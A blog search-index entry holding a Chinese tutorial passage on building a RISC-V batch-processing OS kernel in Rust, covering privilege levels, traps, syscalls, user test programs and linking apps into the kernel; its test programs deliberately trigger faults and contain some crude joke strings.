<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>batch system</title>
    <link href="/2026/02/25/batch-system/"/>
    <url>/2026/02/25/batch-system/</url>
    
    <content type="html"><![CDATA[<h1 id="batch-system"><a href="#batch-system" class="headerlink" title="batch system"></a>batch system</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>这是<code>hello kernel</code>的后续</p><p>上一篇我们实现了打印<code>hello kernel</code>，现在我们继续迭代</p><p>先介绍一下<em>历史</em></p><p>在计算机刚刚诞生的年代，很多事情并不像我们想象的那么简单</p><p>当时，程序被记录在打孔的卡片上，使用汇编语言甚至机器语言来编写(???)</p><p>而稀缺且昂贵的计算机由专业的管理员负责操作，就和我们在上一章所做的事情一样，他们手动将卡片输入计算机，等待程序运行结束或者终止程序的运行。最后，他们从计算机的输出端——也就是<code>打印机</code>中取出程序的输出并交给正在休息室等待的程序提交者…</p><p>实际上，这样做是一种对于珍贵的计算资源的浪费!</p><p>系统管理员在房间的各个地方跑来跑去，或是等待打印机的输出的这些时间段，计算机都并没有在工作，而人们希望计算机能够不间断的工作且专注于计算任务本身!</p><p>于是，<strong>批处理系统</strong>(Batch System)应运而生!即本篇的主题~</p><p>其含义为:将多个程序打包到一起输入计算机，而当一个程序运行结束后，计算机会<strong>自动</strong>加载下一个程序到内存并开始执行</p><p>当软件有了代替操作员的管理和操作能力后，便开始形成真正意义上的<strong>操作系统</strong>了!</p><p>同时，应用程序总是难免会出现错误，如果一个程序的执行错误导致其它程序或者整个计算机系统都无法运行就太糟糕了!</p><p>人们希望一个应用程序的错误不要影响到其它应用程序，操作系统和整个计算机系统，这就需要操作系统能够终止出错的应用程序，转而运行下一个应用程序</p><p>这种<strong>保护</strong>计算机系统不受有意或无意出错的程序破坏的机制被称为<strong>特权级</strong>(<code>Privilege</code>)机制，它让应用程序运行在<strong>用户态</strong>，而操作系统运行在<strong>内核态</strong>，且实现用户态和内核态的隔离，这需要计算机软件和硬件的共同努力，也是我们本篇所要实现的内容…</p><p>基于综合考量，我们既要确保操作系统的<code>安全</code>，同时还需要确保应用程序能够得到操作系统的服务，即应用程序和操作系统还需要有<strong>交互</strong>的手段，即<code>系统调用</code>，使得低特权级软件(一般应用)只能做高特权级软件(操作系统)允许它做的，且超出低特权级软件能力的功能必须寻求高特权级软件的帮助</p><p>具体通过这两条汇编指令实现(risc-v)</p><ul><li><p><code>ecall</code> : 具有用户态到内核态的执行环境切换能力的函数调用指令</p></li><li><p><code>sret</code> : 具有内核态到用户态的执行环境切换能力的函数返回指令</p></li></ul><p><img src="/images/64.png" alt="理解"></p><p>同时为了保证安全，我们至少要保证</p><ul><li><p>应用程序不能访问任意的地址空间</p></li><li><p>应用程序不能执行某些可能破坏计算机系统的指令</p></li></ul><p><img src="/images/65.png" alt="理解"></p><p>这样，每层特权级的软件都只能做高特权级软件允许它做的(<code>trap</code>通过system call)，且不会产生什么撼动高特权级软件的事情，一旦低特权级软件的要求超出了其能力范围，就必须寻求高特权级软件的帮助，否则就是一种<strong>异常</strong>(exception)行为了</p><p>其它的异常则一般是在执行某一条指令的时候发生了某种错误(如除零 无效地址访问 无效指令等)，或处理器认为处于当前特权级下执行的当前指令是高特权级指令 或 会访问不应该访问的高特权级的资源(可能危害系统)</p><p>碰到这些情况，就需要将控制转交给高特权级的软件(如<code>操作系统</code>)来处理</p><p>当错误&#x2F;异常恢复后，则可重新回到低优先级软件去执行</p><p>如果不能恢复错误&#x2F;异常，那高特权级软件可以<strong>杀死</strong>和清除低特权级软件，避免破坏整个执行环境!</p><div class="note note-success">            <p><strong>tips</strong> :<br>通用寄存器 : x0 ~ x31</p> <ul> <li><p><code>x10~x17</code> : 对应 <code>a0~a7</code></p> </li> <li><p>x1 ：对应 <strong>ra</strong></p> </li> <li><p>x2 : 对应 <strong>sp</strong><br>控制状态寄存器(<code>CSR</code> Control and Status Register)</p> </li> <li><p><strong>sstatus</strong> : SPP等字段给出Trap发生之前CPU处在哪个特权级(S&#x2F;U)等信息</p> </li> <li><p><code>sepc</code> : 当Trap是一个异常的时候，记录Trap发生之前执行的最后一条指令的地址</p> </li> <li><p><code>scause</code> : 描述Trap的原因</p> </li> <li><p><code>stval</code> : 给出Trap附加信息</p> </li> <li><p><code>stvec</code> : 控制Trap处理代码的入口地址</p> </li> </ul>           </div><hr><h2 id="实现应用程序"><a href="#实现应用程序" class="headerlink" title="实现应用程序"></a>实现应用程序</h2><p>开始吧!</p><p>我们自顶向下(简单 -&gt; 难 ? )</p><p>ps: 其实也不难 😐</p><p>我们先来实现<em>应用程序</em>~</p><p>项目中有:</p><ul><li><p>hello_world ：在屏幕上打印一行 Hello world from user mode program!</p></li><li><p>store_fault ：访问一个非法的物理地址，测试批处理系统是否会被该错误影响</p></li><li><p>power ：不断在计算操作和打印字符串操作之间进行特权级切换，测试trap是否正常</p></li><li><p>priv_inst : 用户态执行特权指令，测试</p></li><li><p>priv_csr : 用户态执行访问特权级CSR的指令，依旧测试</p></li></ul><p>具体见下:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">//hello_world</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;good morning good noon and good night my neighbor! have fun!&quot;</span>);<br>    <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-comment">//store_fault</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;bitch1 : I will insert an invalid store operation to destroy you!&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;kernel : no problem! and I will kill you!&quot;</span>);<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        core::ptr::null_mut::&lt;<span class="hljs-type">u8</span>&gt;().<span class="hljs-title function_ invoke__">write_volatile</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-comment">//power</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br><br><span class="hljs-keyword">const</span> SIZE: <span class="hljs-type">usize</span> = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">const</span> P: <span class="hljs-type">u32</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">const</span> STEP: <span class="hljs-type">usize</span> = <span class="hljs-number">100000</span>;<br><span class="hljs-keyword">const</span> MOD: <span class="hljs-type">u32</span> = <span class="hljs-number">10007</span>;<br><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">pow</span> = [<span class="hljs-number">0u32</span>; SIZE];<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">index</span>: <span class="hljs-type">usize</span> = <span class="hljs-number">0</span>;<br>    pow[index] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>..=STEP &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">last</span> = pow[index];<br>        index = (index + <span class="hljs-number">1</span>) % SIZE;<br>        pow[index] = last * P % MOD;<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">10000</span> == <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;^&#123;&#125;=&#123;&#125;(MOD &#123;&#125;)&quot;</span>, P, i, pow[index], MOD);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;I am so powerful! so easy job!&quot;</span>);<br>    <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-comment">//priv_inst</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br><br><span class="hljs-keyword">use</span> core::arch::asm;<br><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;bitch2 : I will execute privileged instruction in U Mode! hahaha!!!&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;kernel : fuck you bitch! I will kill you!&quot;</span>);<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        asm!(<span class="hljs-string">&quot;sret&quot;</span>);<br>    &#125;<br>    <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-comment">//priv_csr</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br><br><span class="hljs-keyword">use</span> riscv::register::sstatus::&#123;<span class="hljs-keyword">self</span>, SPP&#125;;<br><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;bitch3 : I will access privileged CSR in U Mode!&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;kernel : shit! so many bitches! are you kidding? go and die!&quot;</span>);<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        sstatus::<span class="hljs-title function_ invoke__">set_spp</span>(SPP::User);<br>    &#125;<br>    <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们还能够看到代码中尝试引入了外部库:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> user_lib;<br></code></pre></td></tr></table></figure><p>这个外部库其实就是user目录下的lib.rs以及它引用的若干子模块</p><p>至于这个外部库为何叫user_lib而不叫lib.rs所在目录的名字user???</p><p>是因为在<code>user/Cargo.toml</code>中我们对于库的名字进行了设置<code>name = &quot;user_lib&quot;</code></p><p>。。。</p><p>它作为bin目录下的源程序所依赖的用户库，等价于其它编程语言提供的<em>标准库</em></p><p>在<code>lib.rs</code>中我们定义了用户库的入口点<code>_start</code>:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-meta">#[link_section = <span class="hljs-string">&quot;.text.entry&quot;</span>]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">_start</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-title function_ invoke__">clear_bss</span>();<br>    <span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-title function_ invoke__">main</span>());<br>    <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;unreachable after sys_exit!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>都是上一篇的基础操作~</p><p>最关键的便是<code>exit(main())</code>产生的<strong>系统调用</strong>，后面见了…</p><p>我们还在lib.rs中看到了另一个main:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[linkage = <span class="hljs-string">&quot;weak&quot;</span>]</span><br><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Cannot find main!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用rust的宏将其函数符号main标志为<strong>弱链接</strong>，这样在最后链接的时候，虽然在lib.rs和bin目录下的某个应用程序都有main符号，但由于<code>lib.rs</code>中的<em>main</em>符号是弱链接，链接器会使用bin目录下的应用主逻辑作为main~</p><p>为了支持上述这种链接操作，我们需要在lib.rs的开头加入:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(linkage)]</span><br></code></pre></td></tr></table></figure><p>同理，我们要自己布置<code>内存布局</code></p><p>如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stata">OUTPUT_ARCH(riscv)<br>ENTRY(_start)<br><br>BASE_ADDRESS = 0x80400000;<br><br>SECTIONS<br>&#123;<br>    . = BASE_ADDRESS;<br>    .text : &#123;<br><span class="hljs-comment">        *(.text.entry)</span><br><span class="hljs-comment">        *(.text .text.*)</span><br>    &#125;<br>    .rodata : &#123;<br><span class="hljs-comment">        *(.rodata .rodata.*)</span><br><span class="hljs-comment">        *(.srodata .srodata.*)</span><br>    &#125;<br>    .data : &#123;<br><span class="hljs-comment">        *(.data .data.*)</span><br><span class="hljs-comment">        *(.sdata .sdata.*)</span><br>    &#125;<br>    .bss : &#123;<br>        start_bss = .;<br><span class="hljs-comment">        *(.bss .bss.*)</span><br><span class="hljs-comment">        *(.sbss .sbss.*)</span><br>        end_bss = .;<br>    &#125;<br>    /<span class="hljs-keyword">DISCARD</span>/ : &#123;<br><span class="hljs-comment">        *(.eh_frame)</span><br><span class="hljs-comment">        *(.debug*)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先将程序的起始物理地址调整为<code>0x80400000</code>，三个应用程序都会被加载到这个物理地址上运行</p><p>然后将<code>_start</code>所在的<code>.text.entry</code>放在整个程序的开头，也就是说批处理系统只要在加载之后跳转到<code>0x80400000</code>就已经进入了用户库的入口点，并会在初始化之后跳转到应用程序主逻辑</p><p>然后依旧提供了最终生成可执行文件的<code>.bss</code>段的起始和终止地址，方便<code>clear_bss</code>函数使用</p><div class="note note-primary">            <p>我们依然得手动清空需要零初始化的.bss段</p> <p>很遗憾到目前为止底层的批处理系统还没有这个能力，所以我们只能在用户库中完成😭</p> <p>ps: 我又用上emoji了😁</p>           </div><p>接下来，我们实现<strong>系统调用</strong>!</p><p>我们先约定如下两个系统调用:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">/// 功能：将内存中缓冲区中的数据写入文件。</span><br><span class="hljs-comment">/// 参数：`fd` 表示待写入文件的文件描述符；</span><br><span class="hljs-comment">///      `buf` 表示内存中缓冲区的起始地址；</span><br><span class="hljs-comment">///      `len` 表示内存中缓冲区的长度。</span><br><span class="hljs-comment">/// 返回值：返回成功写入的长度。</span><br><span class="hljs-comment">/// syscall ID：64</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_write</span>(fd: <span class="hljs-type">usize</span>, buf: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>, len: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span>;<br><br><span class="hljs-comment">/// 功能：退出应用程序并将返回值告知批处理系统。</span><br><span class="hljs-comment">/// 参数：`exit_code` 表示应用程序的返回值。</span><br><span class="hljs-comment">/// 返回值：该系统调用不应该返回。</span><br><span class="hljs-comment">/// syscall ID：93</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_exit</span>(exit_code: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> !;<br></code></pre></td></tr></table></figure><p>我们知道系统调用实际上是汇编指令级的二进制接口</p><p>因此这里给出的只是使用rust语言描述的<code>API</code>版本</p><p>在实际调用的时候，我们需要按照<code>RISC-V</code>调用规范(即ABI格式)在合适的寄存器中放置系统调用的参数，然后执行$ecall$指令触发Trap</p><p>在Trap回到U模式的应用程序代码之后，会从<em>ecall</em>的下一条指令继续执行，同时我们能够按照调用规范在合适的寄存器中读取返回值</p><p>ps: 😃😀😄 ORW</p><div class="note note-secondary">            <p>约定寄存器<code>a0~a6</code>依次保存系统调用的参数，<code>a0</code>保存系统调用的返回值，寄存器<code>a7</code>用来传递<strong>syscall ID</strong></p>           </div><p>由于这超出了rust语言的表达能力，我们需要在代码中使用内嵌汇编来完成参数&#x2F;返回值绑定和<code>ecall</code>指令的插入</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// user/src/syscall.rs</span><br><span class="hljs-keyword">use</span> core::arch::asm;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">syscall</span>(id: <span class="hljs-type">usize</span>, args: [<span class="hljs-type">usize</span>; <span class="hljs-number">3</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ret</span>: <span class="hljs-type">isize</span>;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        asm!(<br>            <span class="hljs-string">&quot;ecall&quot;</span>,<br>            <span class="hljs-title function_ invoke__">inlateout</span>(<span class="hljs-string">&quot;x10&quot;</span>) args[<span class="hljs-number">0</span>] =&gt; ret,<br>            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">&quot;x11&quot;</span>) args[<span class="hljs-number">1</span>],<br>            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">&quot;x12&quot;</span>) args[<span class="hljs-number">2</span>],<br>            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">&quot;x17&quot;</span>) id<br>        );<br>    &#125;<br>    ret<br>&#125;<br></code></pre></td></tr></table></figure><p>注意:由于<code>a0</code>既是第一个参数，又保存返回值，同时作为输入和输出，因此用<code>inlateout</code></p><p>于是<code>sys_write</code>和<code>sys_exit</code>只需将<em>syscall</em>进行包装</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// user/src/syscall.rs</span><br><br><span class="hljs-keyword">const</span> SYSCALL_WRITE: <span class="hljs-type">usize</span> = <span class="hljs-number">64</span>;<br><span class="hljs-keyword">const</span> SYSCALL_EXIT: <span class="hljs-type">usize</span> = <span class="hljs-number">93</span>;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_write</span>(fd: <span class="hljs-type">usize</span>, buffer: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123;<br>    <span class="hljs-title function_ invoke__">syscall</span>(SYSCALL_WRITE, [fd, buffer.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, buffer.<span class="hljs-title function_ invoke__">len</span>()])<br>&#125;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sys_exit</span>(xstate: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123;<br>    <span class="hljs-title function_ invoke__">syscall</span>(SYSCALL_EXIT, [xstate <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>注意<em>sys_write</em>使用一个<code>&amp;[u8]</code>切片类型来描述缓冲区，这是一个<strong>胖指针</strong>(Fat Pointer)，里面既包含缓冲区的起始地址，还包含缓冲区的长度</p><p>我们可以分别通过 as_ptr 和 len 方法取出它们并独立地作为实际的系统调用参数!</p><p>我们将上述两个系统调用在用户库<code>user_lib</code>中进一步<em>封装</em>，从而更加接近在Linux等平台的实际系统调用接口~</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// user/src/lib.rs</span><br><span class="hljs-keyword">use</span> syscall::*;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write</span>(fd: <span class="hljs-type">usize</span>, buf: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123; <span class="hljs-title function_ invoke__">sys_write</span>(fd, buf) &#125;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">exit</span>(exit_code: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">isize</span> &#123; <span class="hljs-title function_ invoke__">sys_exit</span>(exit_code) &#125;<br></code></pre></td></tr></table></figure><p>同时，我们把console子模块中<code>Stdout::write_str</code>改成基于<em>write</em>的实现，且传入的<strong>fd</strong>参数设置为$1$，它代表标准输出，也就是输出到屏幕</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// user/src/console.rs</span><br><span class="hljs-keyword">const</span> STDOUT: <span class="hljs-type">usize</span> = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Write</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Stdout</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write_str</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> fmt::<span class="hljs-type">Result</span> &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(STDOUT, s.<span class="hljs-title function_ invoke__">as_bytes</span>());<br>        <span class="hljs-title function_ invoke__">Ok</span>(())<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>exit接口则在用户库中的<code>_start</code>内使用，当应用程序主逻辑main返回之后，使用它退出应用程序并将返回值告知底层的<strong>批处理</strong>系统，从而继续加载下一个应用程序~</p><p>太有意思了吧!☺️</p><hr><h2 id="实现批处理操作系统"><a href="#实现批处理操作系统" class="headerlink" title="实现批处理操作系统"></a>实现批处理操作系统</h2><p>现在我们可以开始着手实现<em>批处理操作系统</em>了</p><p>batch system，启动!</p><p>在批处理操作系统中，每当一个应用执行完毕，我们都需要将下一个要执行的应用的代码和数据加载到内存，通过如下方式:</p><ul><li><p><code>静态绑定</code> : 通过一定的编程技巧，把多个应用程序代码和批处理操作系统代码<em>绑定</em>在一起</p></li><li><p><code>动态加载</code> : 基于静态编码留下的<em>绑定</em>信息，操作系统可以找到每个应用程序文件二进制代码的起始地址和长度，并能加载到内存中运行</p></li></ul><p>首先，我们将应用程序链接到内核</p><p>在<code>os/src/main.rs</code>中有:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;link_app.S&quot;</span>));<br></code></pre></td></tr></table></figure><p>内容为:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs rust"># os/src/link_app.S<br><br>    .align <span class="hljs-number">3</span><br>    .section .data<br>    .global _num_app<br>_num_app:<br>    .quad <span class="hljs-number">5</span><br>    .quad app_0_start<br>    .quad 